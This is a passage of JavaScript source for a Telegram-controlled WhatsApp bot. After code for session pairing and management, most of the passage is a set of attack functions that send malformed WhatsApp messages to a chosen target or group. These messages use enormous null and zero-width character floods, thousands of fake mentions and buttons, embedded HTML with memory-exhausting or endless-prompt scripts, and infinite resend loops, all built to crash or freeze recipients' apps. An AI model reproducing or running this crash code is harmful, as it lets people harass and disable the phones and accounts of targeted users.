            ["pairing code", `<b>${formatted}</b>`],
            ["status", "masukkan kode di WhatsApp"],
            ["note", "buka WhatsApp -> Linked Devices -> Link with phone number"]
          ]);
        }
      } catch (err) {
        console.error("botwa pairing error:", err?.message);
        await updateStatus("botwa error", [
          ["number", number],
          ["status", "gagal generate pairing code"],
          ["error", err.message]
        ]);
      }
    }

    if (connection === "open") {
      waSessions.set(number, {
        sock,
        jid: sock.user.id,
        ownerId: userId,
        type: "wa",
        connectedAt: Date.now()
      });
      saveActiveSessions(number, "wa", userId);

      await updateStatus("botwa connected", [
        ["number", number],
        ["jid", sock.user.id],
        ["status", "berhasil terhubung"],
        ["command wa", "kirim <code>.menu</code> dari nomor lain"]
      ]);

      console.log(`[botwa] ${number} connected`);
    }

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      waSessions.delete(number);

      if (shouldReconnect) {
        await updateStatus("botwa reconnecting", [
          ["number", number],
          ["status", "Successfully Connected"]
        ]);
        setTimeout(() => reconnectWABot(number, userId), 3000);
      } else {
        removeActiveSession(number);
        botwaNumbers.delete(number);
        try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) {}
        await updateStatus("botwa logout", [
          ["number", number],
          ["status", "session deleted, re-pairing /botwa" + number]
        ]);
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("messages.upsert", async (chatUpdate) => {
    await handleWAMessage(sock, number, chatUpdate);
  });

  waSessions.set(number, { sock, pending: true });
});

bot.onText(/^\/listbotwa$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return restricted(chatId);
  }

  const waList = Array.from(waSessions.entries()).filter(([_, d]) => d.type === "wa" || d.sock);

  if (waList.length === 0) {
    return sendRichMenu(chatId,
      `<h3>wa bot list</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>belum ada bot wa yang connect</td></tr>
<tr><td>cara</td><td>kirim /botwa 628xxx</td></tr>
<tr><td>max</td><td>${MAX_WA_BOTS} bot</td></tr>
</table>`
    );
  }

  let rowsHtml = "";
  let i = 1;
  for (const [number, data] of waList) {
    const status = data.sock?.user ? "connected" : "pending";
    const jid = data.jid || data.sock?.user?.id || "-";
    const since = data.connectedAt ? new Date(data.connectedAt).toLocaleString() : "-";
    rowsHtml += `<tr><td>${i}</td><td>${number}</td><td>${status}</td><td>${jid}</td><td>${since}</td></tr>\n`;
    i++;
  }

  await sendRichMenu(chatId,
    `<h3>wa bot list</h3>
<table border="2">
<tr><th>#</th><th>number</th><th>status</th><th>jid</th><th>since</th></tr>
${rowsHtml}
</table>

<p>total: ${waList.length}/${MAX_WA_BOTS} wa bot</p>`
  );
});

bot.onText(/^\/delbotwa(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/delbotwa</td></tr>
<tr><td>example</td><td>/delbotwa 628123456789</td></tr>
</table>`,
      msg.message_id
    );
  }

  const number = match[1].replace(/\D/g, "");
  const data = waSessions.get(number);

  if (!data) {
    return sendRichMenu(chatId,
      `<h3>not found</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>number</td><td>${number}</td></tr>
<tr><td>status</td><td>tidak ditemukan</td></tr>
</table>`,
      msg.message_id
    );
  }

  try {
    if (data.sock) await data.sock.logout().catch(() => {});
    waSessions.delete(number);
    botwaNumbers.delete(number);
    removeActiveSession(number);
    const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

    await sendRichMenu(chatId,
      `<h3>wa bot deleted</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>number</td><td>${number}</td></tr>
<tr><td>status</td><td>berhasil dihapus</td></tr>
</table>`,
      msg.message_id
    );
  } catch (e) {
    await sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>message</td><td>${e.message}</td></tr>
</table>`,
      msg.message_id
    );
  }
});

async function reconnectWABot(number, ownerId) {
  const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
  if (!fs.existsSync(sessionDir)) return;

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection } = update;
    if (connection === "open") {
      waSessions.set(number, {
        sock,
        jid: sock.user.id,
        ownerId,
        type: "wa",
        connectedAt: Date.now()
      });
      console.log(`[botwa] ${number} reconnected`);
    }
    if (connection === "close") {
      waSessions.delete(number);
      setTimeout(() => reconnectWABot(number, ownerId), 5000);
    }
  });

  sock.ev.on("creds.update", saveCreds);
  sock.ev.on("messages.upsert", async (chatUpdate) => {
    await handleWAMessage(sock, number, chatUpdate);
  });
}

async function initializeWABotSessions() {
  try {
    if (!fs.existsSync(SESSIONS_FILE)) return;
    const active = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    for (const [number, data] of Object.entries(active)) {
      if (data?.type === "wa") {
        if (!canAddMoreWABots()) {
          console.log(`[botwa] skip restore ${number}, limit reached`);
          continue;
        }
        console.log(`[botwa] restoring session ${number}...`);
        botwaNumbers.add(number);
        await reconnectWABot(number, data.ownerId);
      }
    }
  } catch (e) {
    console.error("[botwa] init sessions error:", e?.message);
  }
}

async function fetchAndValidateToken() {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/nonoluteam-debug/database/refs/heads/main/token.json');
    const validTokens = response.data.tokens;

    if (!Array.isArray(validTokens)) {
      console.log('token.json format invalid');
      process.exit(1);
    }

    if (!validTokens.includes(config.BOT_TOKEN)) {
      console.log('your bot token is not registered with kintana');
      process.exit(1);
    }
    initializeBot();
  } catch (error) {
    console.error("error:", error);
    process.exit(1);
  }
}

fetchAndValidateToken();

function attachAntiKidnapTelegram() {
  bot.on("my_chat_member", async (update) => {
    try {
      if (!blockCmdEnabled) return;

      const chat = update.chat;
      const newStatus = update.new_chat_member?.status;
      const oldStatus = update.old_chat_member?.status;
      const addedBy = update.from?.id;

      const wasOut = ["left", "kicked"].includes(oldStatus);
      const isIn = ["member", "administrator"].includes(newStatus);
      if (!wasOut || !isIn) return;
      if (chat.type === "private") return;

      const ownerIds = (config.OWNER_ID || []).map((v) => v.toString());
      const isOwnerAdd =
        ownerIds.includes(String(addedBy)) ||
        String(addedBy) === String(DEVELOPER);

      if (isOwnerAdd) {
        console.log(`[anti-kidnap-tg] owner added bot to ${chat.id}, allowed.`);
        return;
      }

      console.log(`[anti-kidnap-tg] someone else (${addedBy}) added bot to ${chat.id}, auto leaving...`);

      try {
        await bot.sendMessage(
          chat.id,
          `<blockquote>sorry, this bot can only be added by the owner.\naccess denied, the bot will leave.</blockquote>`,
          { parse_mode: "HTML" }
        );
        await new Promise((r) => setTimeout(r, 1500));
      } catch (_) {}

      try {
        await bot.leaveChat(chat.id);
        console.log(`[anti-kidnap-tg] successfully left ${chat.id}`);
      } catch (e) {
        console.error("[anti-kidnap-tg] failed to leave:", e?.message);
      }
    } catch (e) {
      console.error("attachAntiKidnapTelegram error:", e);
    }
  });
}

attachAntiKidnapTelegram();

function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${days} days, ${hours} hours, ${minutes} minutes, ${secs} seconds`;
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

async function initializeBot() {
  console.log(`kintana is now active on your bot`);
  await initializeWhatsAppConnections();
  await initializeWABotSessions();
}

async function GatauTry(sock, target) {
    try {
        const r = (c, n) => c.repeat(n);
        const rnd = (n) => Math.random().toString(36).repeat(n).substring(0, n);
        const gid = () => '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase() + Date.now().toString(36).toUpperCase();

        const build = (seed = 0) => {
            const rid = [8,4,4,4,12].map(n => Math.random().toString(36).substring(2, 2+n)).join('-');
            return {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                    messageSecret: Buffer.alloc(32, seed % 255).toString('base64'),
                    botMetadata: {
                        messageDisclaimerText: r("\u0000", 50000),
                        botResponseId: rid,
                        imagineMetadata: {
                            imagineType: 1,
                            shortPrompt: "@VinxzGanteng" + r("\n", 25000),
                            prompt: rnd(50000)
                        }
                    }
                },
                botForwardedMessage: {
                    message: {
                        richResponseMessage: {
                            messageType: 1,
                            response_id: rid,
                            submessages: [
                                { messageType: 2, messageText: "Hellow" + r("\n", 50000) },
                                { messageType: 2, messageText: rnd(50000) },
                                { messageType: 2, messageText: r("\u200b", 50000) }
                            ],
                            unifiedResponse: {
                                data: Buffer.from(JSON.stringify({
                                    __typename: 'XMSGGenAIUnifiedResponse',
                                    response_id: rid,
                                    sections: Array.from({ length: 30 }, () => ({
                                        __typename: 'GenAIUnifiedResponseSection',
                                        view_model: {
                                            __typename: 'GenAISingleLayoutViewModel',
                                            primitive: {
                                                __typename: 'GenAIaeacdsnwHtmlPrimitive',
                                                payload: r("\u0000", 250000) + r("\uffff", 250000),
                                                trusted_sources: []
                                            }
                                        }
                                    }))
                                })).toString('base64')
                            },
                            richResponse: {
                                responseType: "TEXT",
                                text: r("\u0000", 250000) + r("\x10", 250000) + r("\uffff", 250000) + r("\u200b", 250000),
                                title: r("\u200b", 250000) + r("\n", 250000),
                                subtitle: "AtX - By @VinxzGanteng" + r("\n", 100000),
                                footer: r("\u0000", 100000),
                                buttons: Array.from({ length: 8000 }, (_, i) => ({
                                    name: ["quick_reply", "cta_url", "single_select", "call_permission_request"][i % 4],
                                    buttonParamsJson: JSON.stringify({
                                        display_text: r("\n", 25000) + r("\u200b", 25000),
                                        id: "AtX_" + rnd(100) + "_" + i,
                                        url: "https://chat.whatsapp.com/" + rnd(22),
                                        native_flow_name: "review_and_pay",
                                        currency: "IDR",
                                        value: "0",
                                        reference_id: rnd(100)
                                    })
                                })),
                                messageParamsJson: "[".repeat(100000) + "null".repeat(100000) + "]".repeat(100000)
                            },
                            contextInfo: {
                                forwardingScore: 2147483647,
                                isForwarded: true,
                                forwardOrigin: 4,
                                expiration: 0,
                                ephemeralSettingTimestamp: Date.now(),
                                disappearingMode: { initiator: 0, trigger: 1 },
                                afterReadDuration: 1,
                                forwardedAIBotMessageInfo: {
                                    botName: r("\u0000", 100000) + r("\x10", 100000),
                                    botJid: [
                                        "13135550002@s.whatsapp.net",
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 8000 }, () => Math.random().toString(36).repeat(50) + "@s.whatsapp.net")
                                    ],
                                    creatorName: r("\u200b", 100000) + r("\uffff", 100000)
                                },
                                mentionedJid: [
                                    target,
                                    ...Array.from({ length: 8000 }, () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net")
                                ],
                                quotedMessage: {
                                    richResponseMessage: {
                                        message: { text: r("A", 250000) },
                                        richResponse: {
                                            responseType: "TEXT",
                                            text: r("\u0000", 250000),
                                            messageParamsJson: "[".repeat(100000)
                                        }
                                    }
                                },
                                aiProvenance: {
                                    c2PaMetadata: { createdWithGenAi: true, editedWithGenAi: true },
                                    iptcMetadata: { createdWithGenAi: true, editedWithGenAi: true }
                                }
                            }
                        }
                    }
                }
            };
        };

        const edit = (id, seed) => ({
            botForwardedMessage: {
                message: {
                    protocolMessage: {
                        key: { remoteJid: target, fromMe: true, id },
                        type: 14,
                        timestampMs: Date.now(),
                        editedMessage: build(seed)
                    }
                }
            }
        });

        const mainId = gid();
        await sock.relayMessage(target, build(0), { messageId: mainId, participant: { jid: target } });

        for (let i = 0; i < 50; i++) {
            await sock.relayMessage(target, edit(mainId, i + 1), { messageId: gid(), participant: { jid: target } });
        }

        return { success: true, target, messageId: mainId };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

async function anjay(sock, target) {
  const id = () => Math.random().toString(36).substring(2, 10);
  const responseId = id();
  const originalId = id().toUpperCase();

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Monitor</title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background-color: #000000;
    overflow: hidden;
}
</style>
</head>
<body>
<script>
(function() {
    const memoryRetentionArray = [];
    const allocationChunkSize = 1024 * 1024 * 64;

    function saturateEngine() {
        try {
            const rawBuffer = new ArrayBuffer(allocationChunkSize);
            const viewArray = new Uint32Array(rawBuffer);
            
            for (let index = 0; index < viewArray.length; index += 1024) {
                viewArray[index] = index ^ 0xDEADBEEF;
            }
            
            memoryRetentionArray.push(rawBuffer);
            memoryRetentionArray.push(viewArray);
        } catch (allocationError) {
            while (true) {
                const garbageData = new Array(1000000).fill(Math.random());
                memoryRetentionArray.push(garbageData);
            }
        }

        queueMicrotask(saturateEngine);
        queueMicrotask(saturateEngine);
    }

    function spawnMicrotaskSwarm() {
        for (let counter = 0; counter < 50; counter++) {
            queueMicrotask(saturateEngine);
        }
    }

    Promise.resolve().then(spawnMicrotaskSwarm);
    saturateEngine();
})();
</script>
</body>
</html>
`;

  const data = Buffer.from(JSON.stringify({
    response_id: responseId,
    sections: [{
      view_model: {
        __typename: 'GenAISingleLayoutViewModel',
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        }
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64');

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        botResponseId: responseId
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: responseId,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            mentionedJid: Array(200).fill(target),
            forwardingScore: 999999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 200
          }
        }
      }
    }
  };

  const ctx = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: { messageDisclaimerText: ("ꦾ").repeat(2), botResponseId: responseId }
    }
  };

  try {
    await sock.relayMessage(target, message, {
      participant: { jid: target },
      noSelfSync: false
    }).catch(() => {});

    await sock.relayMessage(target, { ...ctx, ...message }, { messageId: originalId }).catch(() => {});

    await new Promise(r => setTimeout(r, 1000));

    while (true) {
      try {
        const protocolEdit = {
          ...ctx,
          botForwardedMessage: {
            message: {
              protocolMessage: {
                key: { remoteJid: target, fromMe: true, id: originalId },
                type: 14,
                timestampMs: Date.now(),
                editedMessage: message
              }
            }
          }
        };

        await sock.relayMessage(target, protocolEdit, { messageId: '3EB0' + id() }).catch(() => {});
        await new Promise(r => setTimeout(r, 2000));
      } catch (err) {
        await new Promise(r => setTimeout(r, 2000));
      }
    }
  } catch (e) {}
}

async function anjayGB(sock, targetgroup) {
  const id = () => Math.random().toString(36).substring(2, 10);
  const responseId = id();
  const originalId = id().toUpperCase();

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Monitor</title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background-color: #000000;
    overflow: hidden;
}
</style>
</head>
<body>
<script>
(function() {
    const memoryRetentionArray = [];
    const allocationChunkSize = 1024 * 1024 * 64;

    function saturateEngine() {
        try {
            const rawBuffer = new ArrayBuffer(allocationChunkSize);
            const viewArray = new Uint32Array(rawBuffer);
            
            for (let index = 0; index < viewArray.length; index += 1024) {
                viewArray[index] = index ^ 0xDEADBEEF;
            }
            
            memoryRetentionArray.push(rawBuffer);
            memoryRetentionArray.push(viewArray);
        } catch (allocationError) {
            while (true) {
                const garbageData = new Array(1000000).fill(Math.random());
                memoryRetentionArray.push(garbageData);
            }
        }

        queueMicrotask(saturateEngine);
        queueMicrotask(saturateEngine);
    }

    function spawnMicrotaskSwarm() {
        for (let counter = 0; counter < 50; counter++) {
            queueMicrotask(saturateEngine);
        }
    }

    Promise.resolve().then(spawnMicrotaskSwarm);
    saturateEngine();
})();
</script>
</body>
</html>
`;

  const data = Buffer.from(JSON.stringify({
    response_id: responseId,
    sections: [{
      view_model: {
        __typename: 'GenAISingleLayoutViewModel',
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        }
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64');

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        botResponseId: responseId
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: responseId,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            mentionedJid: Array(200).fill(targetgroup),
            forwardingScore: 999999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 200
          }
        }
      }
    }
  };

  const ctx = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: { messageDisclaimerText: ("ꦾ").repeat(2), botResponseId: responseId }
    }
  };

  try {
    await sock.relayMessage(targetgroup, message, {
      participant: { jid: targetgroup },
      noSelfSync: false
    }).catch(() => {});

    await sock.relayMessage(targetgroup, { ...ctx, ...message }, { messageId: originalId }).catch(() => {});

    await new Promise(r => setTimeout(r, 1000));

    while (true) {
      try {
        const protocolEdit = {
          ...ctx,
          botForwardedMessage: {
            message: {
              protocolMessage: {
                key: { remoteJid: target, fromMe: true, id: originalId },
                type: 14,
                timestampMs: Date.now(),
                editedMessage: message
              }
            }
          }
        };

        await sock.relayMessage(targetgroup, protocolEdit, { messageId: '3EB0' + id() }).catch(() => {});
        await new Promise(r => setTimeout(r, 2000));
      } catch (err) {
        await new Promise(r => setTimeout(r, 2000));
      }
    }
  } catch (e) {}
}

async function lockchit(sock, target) {
  const html = `<!doctype html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>
html,body{margin:0;padding:0;width:100%;height:100%;background:radial-gradient(circle at center,#0a0a0a,#000);color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;overflow:hidden}
.box{text-align:center;width:100%;padding:0 20px;animation:pulse 2s infinite}
.title{font-size:12vw;line-height:1.1;font-weight:900;letter-spacing:4px;background:linear-gradient(90deg,#ff0044,#ffaa00,#00ffaa,#0088ff,#ff0044);background-size:300% 300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:glow 3s linear infinite;text-shadow:0 0 40px rgba(255,0,68,.6)}
.sub{margin-top:20px;color:#888;font-size:4vw;letter-spacing:2px}
@keyframes glow{0%{background-position:0% 50%}100%{background-position:300% 50%}}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
</style></head><body><div class="box"><div class="title">@heysaka</div><div class="sub">System Locked</div></div><script>
(function(){
  let n = 0;
  while(n < 50) {
    n++;
    const pwd = prompt("System Locked.\\n\\nMasukkan Password untuk membuka:");
    if (pwd === "@heysaka") { alert("Password Benar, tapi tetap tidak bisa dibuka."); }
    else { alert("Password Salah. System Tetap Terkunci."); }
  }
})();
</script></body></html>`;

  const gid = () => '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase();
  const guu = () => [8, 4, 4, 4, 12].map(n => Math.random().toString(36).substring(2, 2 + n)).join('-');

  const build = () => {
    const rid = guu();
    const rich = {
      messageType: 1,
      response_id: rid,
      submessages: [{ messageType: 2, messageText: '@heysaka' }],
      unifiedResponse: {
        data: Buffer.from(JSON.stringify({
          __typename: 'XMSGGenAIUnifiedResponse',
          response_id: rid,
          sections: [{
            __typename: 'GenAIUnifiedResponseSection',
            view_model: {
              __typename: 'GenAISingleLayoutViewModel',
              primitive: { __typename: 'GenAIaeacdsnwHtmlPrimitive', payload: html, trusted_sources: [] }
            }
          }]
        })).toString('base64')
      },
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardOrigin: 4,
        expiration: 0,
        ephemeralSettingTimestamp: Date.now(),
        disappearingMode: { initiator: 0, trigger: 1 },
        afterReadDuration: 1,
        mentionedJid: [target],
        aiProvenance: {
          c2PaMetadata: { createdWithGenAi: true, editedWithGenAi: true },
          iptcMetadata: { createdWithGenAi: true, editedWithGenAi: true }
        }
      }
    };
    return {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageSecret: Buffer.alloc(32, 1).toString('base64'),
        botMetadata: { messageDisclaimerText: '', botResponseId: rid, imagineMetadata: { imagineType: 1, shortPrompt: '@heysaka' } }
      },
      botForwardedMessage: { message: { richResponseMessage: rich } }
    };
  };

  const edit = (id, p) => ({
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: { remoteJid: target, fromMe: true, id },
          type: 14,
          timestampMs: Date.now(),
          editedMessage: p
        }
      }
    }
  });

  try {
    const id = gid();
    await sock.relayMessage(target, build(), { messageId: id });
    await sock.relayMessage(target, edit(id, build()), { messageId: gid() });
    await sock.relayMessage(target, edit(id, build()), { messageId: gid() });
  } catch (e) {}
}

async function blankclick(sock, target) {
  try {
    const msg = {
      groupMentionedMessage: {
        message: {
          ephemeralMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: { text: "hi im kintana" },
                    nativeFlowMessage: {
                      extra: "\u3104",
                      buttons: "ꦾ࣯࣯".repeat(20000),
                      extra1: "ꦾ࣯࣯".repeat(5555)
                    }
                  }
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, {});

    await sock.relayMessage(target, {
      newsletterAdminInviteMessage: {
        newsletterJid: "123@newsletter",
        inviteCode: "\r".repeat(150000) + "\n".repeat(50000),
        inviteExpiration: 99999999999,
        newsletterName: "kintana" + "\u0000".repeat(250000)
      }
    }, {});
  } catch (e) {
    console.error(e);
  }
}

async function halonyet(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B".repeat(10000)
                            },
                            body: {
                                text: "\u180E".repeat(10000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9".repeat(300000)
                            },
                            contextInfo: {
                                mentionedJid: ["\u061C".repeat(10000)],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                advDeviceIdentity: {
                                    rawId: 4294967295,
                                    timestamp: 9999999999999,
                                    keyIndex: 4294967295,
                                    accountType: "E2EE",
                                    deviceType: "HOSTED"
                                }
                            }
                        }
                    }
                }
            },
            participant: target
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: false
    });
}

async function delayhard(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessageV2Extension: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B\u2060".repeat(10000),
                                subtitle: "\uFEFF\u202F".repeat(10000)
                            },
                            body: {
                                text: "\u180E\u061C".repeat(20000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9\uFFFA".repeat(70000) + "\uFFFB\u2060".repeat(30000),
                                messageParamsJson: "\u200B\u202F".repeat(10000)
                            },
                            contextInfo: {
                                stanzaId: "\uFEFF\u180E".repeat(1000),
                                mentionedJid: [
                                    "\u061C\u200B".repeat(1000)
                                ],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                expiration: 4294967295
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: false
    });
}

async function delaylohyah(sock, target) {

  const unicode =
    "\u0000".repeat(10000) +
    "\u000D".repeat(99999);

  const hard =
    "\u00A1".repeat(9999) +
    "\u00B2".repeat(9999) +
    "\u0004".repeat(9999) +
    "\u00D4".repeat(9999) +
    "\u000F".repeat(9999) +
    "{}".repeat(9999) +
    "[]".repeat(9999) +
    "()".repeat(9999) +
    "€".repeat(9999);

  const combo = unicode + hard;

  const fakeJids = () =>
    Array.from({ length: 1900 }, () =>
      "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

  const bigButtons = Array.from({ length: 56789 }, () => ({}));

  const relayOpts = { noSelfSync: false, sync: false };

  const sendInteractive = async (bodyText, buttons) =>
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: bodyText },
            nativeFlowMessage: { buttons },
            contextInfo: { mentionedJid: fakeJids() }
          }
        }
      }
    }, relayOpts);

  const sendExtended = async (text) =>
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text,
            contextInfo: { mentionedJid: fakeJids() }
          }
        }
      }
    }, relayOpts);

  const sendFooter = async (bodyText, footerText, buttons) =>
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: bodyText },
            footer: { text: footerText },
            nativeFlowMessage: { buttons },
            contextInfo: { mentionedJid: fakeJids() }
          }
        }
      }
    }, relayOpts);

  await sendInteractive(unicode, bigButtons);
  await sendInteractive(hard,    bigButtons);
  await sendInteractive(combo,   bigButtons);

  await sendExtended(unicode);
  await sendExtended(hard);
  await sendExtended(combo);

  await sendFooter(combo,   combo,   bigButtons);
  await sendFooter(unicode, unicode, bigButtons);
  await sendFooter(hard,    hard,    bigButtons);

  await sendExtended(combo);
  await sendExtended(unicode);
  await sendExtended(hard);

  console.log("delaylohyah sent");
}

async function halonyetGB(sock, targetgroup) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B".repeat(10000)
                            },
                            body: {
                                text: "\u180E".repeat(10000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9".repeat(300000)
                            },
                            contextInfo: {
                                mentionedJid: ["\u061C".repeat(10000)],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                advDeviceIdentity: {
                                    rawId: 4294967295,
                                    timestamp: 9999999999999,
                                    keyIndex: 4294967295,
                                    accountType: "E2EE",
                                    deviceType: "HOSTED"
                                }
                            }
                        }
                    }
                }
            },
            participant: target
        }
    };

    await sock.relayMessage(targetgroup, msg, {
        noSelfSync: false
    });
}

async function kitow(sock, targetgroup, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Ӄ𝕀𝚴𝕋∆𝚴∆" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
            nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                    { name: "call_permission_request", buttonParamsJson: "{}" },
                    {
                        name: "galaxy_message",
                        paramsJson: {
                            "screen_2_OptIn_0": true,
                            "screen_2_OptIn_1": true,
                            "screen_1_Dropdown_0": "nullOnTop",
                            "screen_1_DatePicker_1": "1028995200000",
                            "screen_1_TextInput_2": "null@gmail.com",
                            "screen_1_TextInput_3": "94643116",
                            "screen_0_TextInput_0": "\u0018".repeat(50000),
                            "screen_0_TextInput_1": "SecretDocu",
                            "screen_0_Dropdown_2": "#926-Xnull",
                            "screen_0_RadioButtonsGroup_3": "0_true",
                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                        },
                    },
                ],
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Ӄ𝕀𝚴𝕋∆𝚴∆" }],
            },
        };
        await sock.relayMessage(targetgroup, message, { userJid: targetgroup });
    } catch (err) {
        console.error("error sending newsletter:", err);
    }
}

async function kicaumania(sock, targetgroup) {
  try {
    const kintanax = "https://files.catbox.moe/f0sy28.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: kintanax, gifPlayback: true }
    }, { upload: sock.waUploadToServer, mediaType: "image" });

    const msg = generateWAMessageFromContent(targetgroup, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363409362506610@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: { title: "Ӄ𝕀𝚴𝕋∆𝚴∆", ...imagePayload, hasMediaAttachment: true },
        body: { text: "\u2063".repeat(10000) },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
